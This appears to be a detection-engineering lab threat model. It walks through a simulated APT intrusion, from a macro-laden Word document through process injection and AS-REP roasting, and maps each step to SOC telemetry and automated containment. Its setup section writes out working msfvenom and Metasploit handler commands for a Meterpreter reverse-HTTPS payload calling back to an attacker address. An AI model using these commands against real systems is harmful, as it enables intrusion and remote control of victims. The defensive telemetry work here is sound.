# Threat Model & Attack Chain Lifecycle

## 1. Adversary Strategy & Execution Narrative

The simulated attack chain in Project Alpine emulates an Advanced Persistent Threat (APT) executing a targeted intrusion into a corporate Windows environment to compromise Active Directory.

**Lab IP Architecture Allocation:**
* **Attacker Machine (Kali/BlackArch)**: `192.168.100.50`
* **Victim Endpoint (HR-01)**: `10.0.0.15`
* **Domain Controller (AD DC)**: `10.0.0.10`
* **SOC / SIEM (Hidden via NAT)**: `10.254.2.100` (Gateway VIP: `10.254.2.1`)

---

## 2. Attack Simulation Setup (The Adversary Perspective)

To generate the initial foothold, the attacker creates a weaponized Macro-Enabled Word Document (`.docm`). Using the `vba-psh` payload format generates a VBA macro that executes the stager **entirely in memory** via PowerShell, avoiding dropping any `.ps1` files to the disk.

**Step A: Generating the Payload**
```bash
# Generate the VBA Macro with an embedded Base64 PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.50 LPORT=443 -f vba-psh -o macro.txt
```
*The attacker copies the output of `macro.txt` and pastes it into the VBA editor of `invoice.docm`.*

**Step B: Starting the C2 Listener**
```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.100.50
set LPORT 443
run
```

---

## 3. Attack Phases & Telemetry Mapping

### Step 1: Initial Access & Mark of the Web
* **Adversary Action**: The victim receives a spearphishing email and downloads `invoice.docm` via Google Chrome.
* **Telemetry Signatures**:
  * **Sysmon Event ID 11 (File Creation)**: Logs `chrome.exe` creating `invoice.docm` in `C:\Users\victim\Downloads\`.
  * **Sysmon Event ID 15 (FileCreateStreamHash)**: Logs the creation of the NTFS Alternate Data Stream `invoice.docm:Zone.Identifier` with `ZoneId=3` (Internet Zone), proving the file originated from the internet.

### Step 2: Fileless Code Execution (Script Block Logging)
* **Adversary Action**: The user opens the document and clicks "Enable Content". The macro executes.
* **Execution Mechanics**: The macro is executed directly by the Microsoft Word process (`WINWORD.EXE`). It uses `WScript.Shell` internally to spawn PowerShell, passing the entire Meterpreter stager as a massive Base64-encoded command-line argument. The payload executes completely in memory.
* **Telemetry Signatures**:
  * **Sysmon Event ID 1**: Parent `WINWORD.EXE` spawns child `powershell.exe -nop -w hidden -e <BASE64_STRING>`.
  * **Windows Event ID 4104 (Script Block Logging)**: Captures the de-obfuscated script block executing in memory, exposing the raw byte array (`[Byte[]]$buf = 0xfc...`) of the Meterpreter shellcode to the SOC analyst.

### Step 3: Process Injection
* **Adversary Action**: To disguise long-running C2 communication as native system activity, the PowerShell script injects the shellcode into `explorer.exe`.
* **Telemetry Signatures**:
  * **Sysmon Event ID 10 (ProcessAccess)**: The stager opens a handle to `explorer.exe` with `PROCESS_VM_WRITE` and `PROCESS_VM_OPERATION` access rights.
  * **Sysmon Event ID 8 (CreateRemoteThread)**: A new thread is allocated and executed inside the target `explorer.exe` process address space.

### Step 4: C2 Infrastructure & Encrypted Beaconing
* **Adversary Action**: The injected `explorer.exe` process establishes an encrypted Meterpreter session back to `192.168.100.50:443`, transmitting periodic heartbeats every 2.0 seconds.
* **Telemetry Signatures**:
  * **Sysmon Event ID 3 (Network Connection)**: `explorer.exe` making outbound HTTPS connections to `192.168.100.50` on port 443.
  * **Zeek (`conn.log`)**: High-frequency connection pairs to `192.168.100.50` with uniform payload byte sizes and strict 2.0-second time deltas.
  * **Suricata (`eve.json`)**: JA4 TLS Client Hello fingerprint match `t13d1516h2_8daaf6152771_a00000000000`.

### Step 5: Active Directory Discovery (SharpHound)
* **Adversary Action**: The attacker executes SharpHound within the session to map domain attack paths, querying the Domain Controller (`10.0.0.10`) for privileged accounts.
* **Telemetry Signatures**:
  * **SilkETW (`Microsoft-Windows-LDAP-Client`)**: YARA engine matches LDAP search filters targeting `Domain Admins`, `Enterprise Admins`, and `userAccountControl:.*=4194304`.

### Step 6: Honeytoken AS-REP Roasting & Automated Neutralization
* **Adversary Action**: SharpHound identifies `svc_sql_prod_migration` as having Kerberos pre-authentication disabled. The attacker issues an AS-REP request to `10.0.0.10` to retrieve the encrypted TGT.
* **Telemetry Signatures**:
  * **Windows Event ID 4768**: A Kerberos TGT was requested:
    * `TargetUserName`: `svc_sql_prod_migration`
    * `PreAuthType`: `0`
    * `TicketEncryptionType`: `0x17` (RC4 downgrade)
    * `ClientAddress`: `10.0.0.15`
* **Automated Containment**: Splunk ingests the EID 4768 alert, crosses the Risk-Based Alerting threshold (100 points), and fires the Micro-SOAR webhook. The SOAR server (`10.254.2.100`) connects to `10.0.0.15` via WinRM on V.S 2 and injects Windows Firewall rules, completely neutralizing the compromise in under 3 seconds.
